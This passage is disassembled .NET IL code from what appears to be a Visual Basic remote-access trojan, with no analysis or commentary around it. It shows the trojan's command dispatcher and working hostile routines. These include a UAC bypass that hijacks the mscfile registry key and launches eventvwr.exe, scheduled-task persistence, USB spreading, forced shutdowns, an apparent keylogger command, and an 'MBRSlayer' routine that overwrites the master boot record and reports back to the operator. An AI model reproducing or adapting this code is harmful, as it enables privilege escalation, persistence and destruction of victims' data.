      IL_0510:  ldc.i4.0
      IL_0511:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0516:  brfalse    IL_0c88

      IL_051b:  br         IL_1b0b

      IL_0520:  ldloc.2
      IL_0521:  ldstr      "LightsOut"
      IL_0526:  ldc.i4.0
      IL_0527:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_052c:  brfalse    IL_0cde

      IL_0531:  br         IL_1b0b

      IL_0536:  ldloc.2
      IL_0537:  ldstr      "boing"
      IL_053c:  ldc.i4.0
      IL_053d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0542:  brfalse    IL_0d31

      IL_0547:  br         IL_1b0b

      IL_054c:  ldloc.2
      IL_054d:  ldstr      "lockon"
      IL_0552:  ldc.i4.0
      IL_0553:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0558:  brfalse    IL_0d8f

      IL_055d:  br         IL_1b0b

      IL_0562:  ldloc.2
      IL_0563:  ldstr      "lockoff"
      IL_0568:  ldc.i4.0
      IL_0569:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_056e:  brfalse    IL_0dee

      IL_0573:  br         IL_1b0b

      IL_0578:  ldloc.2
      IL_0579:  ldstr      "rainbow"
      IL_057e:  ldc.i4.0
      IL_057f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0584:  brfalse    IL_0e36

      IL_0589:  br         IL_1b0b

      IL_058e:  ldloc.2
      IL_058f:  ldstr      "sysicos"
      IL_0594:  ldc.i4.0
      IL_0595:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_059a:  brfalse    IL_0ea9

      IL_059f:  br         IL_1b0b

      IL_05a4:  ldloc.2
      IL_05a5:  ldstr      "lines"
      IL_05aa:  ldc.i4.0
      IL_05ab:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05b0:  brfalse    IL_0fb0

      IL_05b5:  br         IL_1b0b

      IL_05ba:  ldloc.2
      IL_05bb:  ldstr      "icocrazy"
      IL_05c0:  ldc.i4.0
      IL_05c1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05c6:  brfalse    IL_1181

      IL_05cb:  br         IL_1b0b

      IL_05d0:  ldloc.2
      IL_05d1:  ldstr      "spooky"
      IL_05d6:  ldc.i4.0
      IL_05d7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05dc:  brfalse    IL_1288

      IL_05e1:  br         IL_1b0b

      IL_05e6:  ldloc.2
      IL_05e7:  ldstr      "gradient"
      IL_05ec:  ldc.i4.0
      IL_05ed:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05f2:  brfalse    IL_148c

      IL_05f7:  br         IL_1b0b

      IL_05fc:  ldloc.2
      IL_05fd:  ldstr      "newmouse"
      IL_0602:  ldc.i4.0
      IL_0603:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0608:  brfalse    IL_161e

      IL_060d:  br         IL_1b0b

      IL_0612:  ldloc.2
      IL_0613:  ldstr      "OpenCD"
      IL_0618:  ldc.i4.0
      IL_0619:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_061e:  brfalse    IL_1639

      IL_0623:  br         IL_1b0b

      IL_0628:  ldloc.2
      IL_0629:  ldstr      "CloseCD"
      IL_062e:  ldc.i4.0
      IL_062f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0634:  brfalse    IL_1650

      IL_0639:  br         IL_1b0b

      IL_063e:  ldloc.2
      IL_063f:  ldstr      "MonitorON"
      IL_0644:  ldc.i4.0
      IL_0645:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_064a:  brfalse    IL_1667

      IL_064f:  br         IL_1b0b

      IL_0654:  ldloc.2
      IL_0655:  ldstr      "MonitorOFF"
      IL_065a:  ldc.i4.0
      IL_065b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0660:  brfalse    IL_167d

      IL_0665:  br         IL_1b0b

      IL_066a:  ldloc.2
      IL_066b:  ldstr      "HideTask"
      IL_0670:  ldc.i4.0
      IL_0671:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0676:  brfalse    IL_1693

      IL_067b:  br         IL_1b0b

      IL_0680:  ldloc.2
      IL_0681:  ldstr      "ShowTask"
      IL_0686:  ldc.i4.0
      IL_0687:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_068c:  brfalse    IL_16aa

      IL_0691:  br         IL_1b0b

      IL_0696:  ldloc.2
      IL_0697:  ldstr      "HideDesk"
      IL_069c:  ldc.i4.0
      IL_069d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06a2:  brfalse    IL_16c1

      IL_06a7:  br         IL_1b0b

      IL_06ac:  ldloc.2
      IL_06ad:  ldstr      "ShowDesk"
      IL_06b2:  ldc.i4.0
      IL_06b3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06b8:  brfalse    IL_16d8

      IL_06bd:  br         IL_1b0b

      IL_06c2:  ldloc.2
      IL_06c3:  ldstr      "PermisaoFrmTerrror"
      IL_06c8:  ldc.i4.0
      IL_06c9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06ce:  brfalse    IL_16ef

      IL_06d3:  br         IL_1b0b

      IL_06d8:  ldloc.2
      IL_06d9:  ldstr      "EnviarImagemTerrorrr"
      IL_06de:  ldc.i4.0
      IL_06df:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06e4:  brfalse    IL_16ff

      IL_06e9:  br         IL_1b0b

      IL_06ee:  ldloc.2
      IL_06ef:  ldstr      "EnviarImagemScreammm"
      IL_06f4:  ldc.i4.0
      IL_06f5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06fa:  brfalse    IL_177b

      IL_06ff:  br         IL_1b0b

      IL_0704:  ldloc.2
      IL_0705:  ldstr      "SoundUp"
      IL_070a:  ldc.i4.0
      IL_070b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0710:  brfalse    IL_17f7

      IL_0715:  br         IL_1b0b

      IL_071a:  ldloc.2
      IL_071b:  ldstr      "Error"
      IL_0720:  ldc.i4.0
      IL_0721:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0726:  brfalse    IL_184b

      IL_072b:  br         IL_1b0b

      IL_0730:  ldloc.2
      IL_0731:  ldstr      "Speech"
      IL_0736:  ldc.i4.0
      IL_0737:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_073c:  brfalse    IL_1938

      IL_0741:  br         IL_1b0b

      IL_0746:  ldloc.2
      IL_0747:  ldstr      "fun"
      IL_074c:  ldc.i4.0
      IL_074d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0752:  brfalse    IL_197b

      IL_0757:  br         IL_1b0b

      IL_075c:  ldloc.2
      IL_075d:  ldstr      "Piano"
      IL_0762:  ldc.i4.0
      IL_0763:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0768:  brfalse    IL_198b

      IL_076d:  br         IL_1b0b

      IL_0772:  ldloc.2
      IL_0773:  ldstr      "sht"
      IL_0778:  ldc.i4.0
      IL_0779:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_077e:  brfalse    IL_19b5

      IL_0783:  br         IL_1b0b

      IL_0788:  ldloc.2
      IL_0789:  ldstr      "rst"
      IL_078e:  ldc.i4.0
      IL_078f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0794:  brfalse    IL_19ca

      IL_0799:  br         IL_1b0b

      IL_079e:  ldloc.2
      IL_079f:  ldstr      "lof"
      IL_07a4:  ldc.i4.0
      IL_07a5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07aa:  brfalse    IL_19df

      IL_07af:  br         IL_1b0b

      IL_07b4:  ldloc.2
      IL_07b5:  ldstr      "botk"
      IL_07ba:  ldc.i4.0
      IL_07bb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07c0:  brfalse    IL_19f4

      IL_07c5:  br         IL_1b0b

      IL_07ca:  ldloc.2
      IL_07cb:  ldstr      "WMM"
      IL_07d0:  ldc.i4.0
      IL_07d1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07d6:  brfalse    IL_19fe

      IL_07db:  br         IL_1b0b

      IL_07e0:  ldloc.2
      IL_07e1:  ldstr      "DisWMM"
      IL_07e6:  ldc.i4.0
      IL_07e7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07ec:  brfalse    IL_1a0d

      IL_07f1:  br         IL_1b0b

      IL_07f6:  ldloc.2
      IL_07f7:  ldstr      "SCRM"
      IL_07fc:  ldc.i4.0
      IL_07fd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0802:  brfalse    IL_1a1c

      IL_0807:  br         IL_1b0b

      IL_080c:  ldloc.2
      IL_080d:  ldstr      "NoSCRM"
      IL_0812:  ldc.i4.0
      IL_0813:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0818:  brfalse    IL_1a2b

      IL_081d:  br         IL_1b0b

      IL_0822:  ldloc.2
      IL_0823:  ldstr      "ll"
      IL_0828:  ldc.i4.0
      IL_0829:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_082e:  brfalse    IL_1a3a

      IL_0833:  br         IL_1b0b

      IL_0838:  ldloc.2
      IL_0839:  ldstr      "kl"
      IL_083e:  ldc.i4.0
      IL_083f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0844:  brfalse    IL_1a45

      IL_0849:  br         IL_1b0b

      IL_084e:  ldloc.2
      IL_084f:  ldstr      "prof"
      IL_0854:  ldc.i4.0
      IL_0855:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_085a:  brfalse    IL_1a6e

      IL_085f:  br         IL_1b0b

      IL_0864:  call       void Persistence::Startup()
      IL_0869:  leave      IL_26c9

      IL_086e:  nop
      .try
      {
        IL_086f:  ldstr      "%SystemRoot%\\system32\\mmc.exe"
        IL_0874:  ldstr      " \"%1\" %*"
        IL_0879:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_087e:  stloc.s    V_10
        IL_0880:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
        IL_0885:  ldstr      "Software\\Classes\\mscfile\\shell\\open\\command"
        IL_088a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
        IL_088f:  ldstr      ""
        IL_0894:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
        IL_0899:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
        IL_089e:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_08a3:  call       string [mscorlib]System.IO.Path::GetFileName(string)
        IL_08a8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_08ad:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_08b2:  ldstr      "eventvwr.exe"
        IL_08b7:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_08bc:  pop
        IL_08bd:  ldc.i4     0x1f4
        IL_08c2:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_08c7:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
        IL_08cc:  ldstr      "Software\\Classes\\mscfile\\shell\\open\\command"
        IL_08d1:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
        IL_08d6:  ldstr      ""
        IL_08db:  ldloc.s    V_10
        IL_08dd:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_08e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
        IL_08e7:  leave.s    IL_08f8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_08e9:  dup
        IL_08ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08ef:  stloc.s    V_11
        IL_08f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_08f6:  leave.s    IL_08f8

      }  // end handler
      IL_08f8:  leave      IL_26c9

      IL_08fd:  nop
      .try
      {
        IL_08fe:  ldstr      "C://win.dat"
        IL_0903:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_0908:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_090d:  ldstr      "MSG"
        IL_0912:  ldsfld     string j.OK::Y
        IL_0917:  ldstr      "Check: You have admin rights."
        IL_091c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0921:  call       bool j.OK::Send(string)
        IL_0926:  pop
        IL_0927:  ldstr      "C://win.dat"
        IL_092c:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0931:  leave      IL_1b0b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0936:  dup
        IL_0937:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_093c:  stloc.s    V_12
        IL_093e:  ldloc.s    V_12
        IL_0940:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_0945:  ldstr      "denied"
        IL_094a:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_094f:  brfalse.s  IL_096b

        IL_0951:  ldstr      "MSG"
        IL_0956:  ldsfld     string j.OK::Y
        IL_095b:  ldstr      "Check: You have no admin rights."
        IL_0960:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0965:  call       bool j.OK::Send(string)
        IL_096a:  pop
        IL_096b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0970:  leave      IL_1b0b

      }  // end handler
      IL_0975:  nop
      .try
      {
        IL_0976:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
        IL_097b:  dup
        IL_097c:  ldc.i4.1
        IL_097d:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
        IL_0982:  dup
        IL_0983:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_0988:  call       string [mscorlib]System.IO.Path::GetFileName(string)
        IL_098d:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
        IL_0992:  dup
        IL_0993:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
        IL_0998:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
        IL_099d:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WorkingDirectory(string)
        IL_09a2:  dup
        IL_09a3:  ldstr      "runas"
        IL_09a8:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Verb(string)
        IL_09ad:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
        IL_09b2:  pop
        IL_09b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
        IL_09b8:  leave      IL_1b0b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_09bd:  dup
        IL_09be:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09c3:  stloc.s    V_13
        IL_09c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_09ca:  leave      IL_1b0b

      }  // end handler
      IL_09cf:  ldc.i4.5
      IL_09d0:  newarr     [mscorlib]System.String
      IL_09d5:  dup
      IL_09d6:  ldc.i4.0
      IL_09d7:  ldstr      "schtasks /create /sc minute /mo 1 /tn "
      IL_09dc:  stelem.ref
      IL_09dd:  dup
      IL_09de:  ldc.i4.1
      IL_09df:  ldsfld     string j.OK::SCHEDNAME
      IL_09e4:  stelem.ref
      IL_09e5:  dup
      IL_09e6:  ldc.i4.2
      IL_09e7:  ldstr      " /tr "
      IL_09ec:  stelem.ref
      IL_09ed:  dup
      IL_09ee:  ldc.i4.3
      IL_09ef:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_09f4:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_09f9:  stelem.ref
      IL_09fa:  dup
      IL_09fb:  ldc.i4.4
      IL_09fc:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0a01:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_0a06:  stelem.ref
      IL_0a07:  call       string [mscorlib]System.String::Concat(string[])
      IL_0a0c:  ldc.i4.0
      IL_0a0d:  ldc.i4.1
      IL_0a0e:  ldc.i4     0x1388
      IL_0a13:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0a18:  pop
      IL_0a19:  br         IL_1b0b

      IL_0a1e:  ldstr      "schtasks /delete /tn "
      IL_0a23:  ldsfld     string j.OK::SCHEDNAME
      IL_0a28:  ldstr      " /f"
      IL_0a2d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a32:  ldc.i4.0
      IL_0a33:  ldc.i4.1
      IL_0a34:  ldc.i4     0x1388
      IL_0a39:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0a3e:  pop
      IL_0a3f:  br         IL_1b0b

      IL_0a44:  call       void spredusb::Start()
      IL_0a49:  leave      IL_26c9

      IL_0a4e:  ldstr      "shutdown -r -t 00 -f"
      IL_0a53:  ldc.i4.0
      IL_0a54:  ldc.i4.0
      IL_0a55:  ldc.i4.m1
      IL_0a56:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0a5b:  pop
      IL_0a5c:  leave      IL_26c9

      IL_0a61:  ldstr      "shutdown -s -t 00 -f"
      IL_0a66:  ldc.i4.0
      IL_0a67:  ldc.i4.0
      IL_0a68:  ldc.i4.m1
      IL_0a69:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0a6e:  pop
      IL_0a6f:  leave      IL_26c9

      IL_0a74:  nop
      .try
      {
        IL_0a75:  ldstr      "C://test.txt"
        IL_0a7a:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_0a7f:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_0a84:  ldstr      "MSG"
        IL_0a89:  ldsfld     string j.OK::Y
        IL_0a8e:  ldstr      "MBR Overwritten, Victim rebooted."
        IL_0a93:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0a98:  call       bool j.OK::Send(string)
        IL_0a9d:  pop
        IL_0a9e:  call       void Stub.MBRSlayer::Start()
        IL_0aa3:  ldstr      "cmd /c start shutdown /r /f /t 3"
        IL_0aa8:  ldc.i4.0
        IL_0aa9:  ldc.i4.1
        IL_0aaa:  ldc.i4     0x1388
        IL_0aaf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_0ab4:  pop
        IL_0ab5:  ldstr      "C://test.txt"
        IL_0aba:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0abf:  leave      IL_1b0b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ac4:  dup
        IL_0ac5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0aca:  stloc.s    V_14
        IL_0acc:  ldloc.s    V_14
        IL_0ace:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_0ad3:  ldstr      "denied"
        IL_0ad8:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0add:  brfalse.s  IL_0af9

        IL_0adf:  ldstr      "MSG"
        IL_0ae4:  ldsfld     string j.OK::Y
        IL_0ae9:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_0aee:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0af3:  call       bool j.OK::Send(string)
        IL_0af8:  pop
        IL_0af9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0afe:  leave      IL_1b0b

      }  // end handler
      IL_0b03:  nop
      .try
      {
        IL_0b04:  ldstr      "C://test.txt"
        IL_0b09:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_0b0e:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_0b13:  ldstr      "MSG"
        IL_0b18:  ldsfld     string j.OK::Y
        IL_0b1d:  ldstr      "MBR Overwritten."
        IL_0b22:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0b27:  call       bool j.OK::Send(string)
        IL_0b2c:  pop
        IL_0b2d:  call       void Stub.MBRSlayer::Start()
        IL_0b32:  ldstr      "C://test.txt"
        IL_0b37:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0b3c:  leave      IL_1b0b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0b41:  dup
        IL_0b42:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b47:  stloc.s    V_15
        IL_0b49:  ldloc.s    V_15
        IL_0b4b:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_0b50:  ldstr      "denied"
        IL_0b55:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0b5a:  brfalse.s  IL_0b76

        IL_0b5c:  ldstr      "MSG"
        IL_0b61:  ldsfld     string j.OK::Y
        IL_0b66:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_0b6b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0b70:  call       bool j.OK::Send(string)
        IL_0b75:  pop
        IL_0b76:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b7b:  leave      IL_1b0b

      }  // end handler
      IL_0b80:  call       native int j.OK::GetDesktopWindow()
      IL_0b85:  call       native int j.OK::GetWindowDC(native int)
      IL_0b8a:  stloc.s    V_16
      IL_0b8c:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0b91:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0b96:  stloc.s    V_19
      IL_0b98:  ldloca.s   V_19
      IL_0b9a:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0b9f:  stloc.s    V_17
      IL_0ba1:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0ba6:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0bab:  stloc.s    V_19
      IL_0bad:  ldloca.s   V_19
      IL_0baf:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0bb4:  stloc.s    V_18
      IL_0bb6:  ldloc.s    V_16
      IL_0bb8:  ldc.i4.0
      IL_0bb9:  ldloc.s    V_18
      IL_0bbb:  ldloc.s    V_17
      IL_0bbd:  ldc.i4.0
      IL_0bbe:  ldloc.s    V_18
      IL_0bc0:  sub.ovf
      IL_0bc1:  ldloc.s    V_16
      IL_0bc3:  ldc.i4.0
      IL_0bc4:  ldc.i4.0
      IL_0bc5:  ldloc.s    V_17
      IL_0bc7:  ldloc.s    V_18
      IL_0bc9:  ldc.i4     0xcc0020
      IL_0bce:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0bd3:  pop
      IL_0bd4:  br         IL_1b0b

      IL_0bd9:  call       native int j.OK::GetDesktopWindow()
      IL_0bde:  call       native int j.OK::GetWindowDC(native int)
      IL_0be3:  stloc.s    V_20
      IL_0be5:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0bea:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0bef:  stloc.s    V_19
      IL_0bf1:  ldloca.s   V_19
      IL_0bf3:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0bf8:  stloc.s    V_21
      IL_0bfa:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
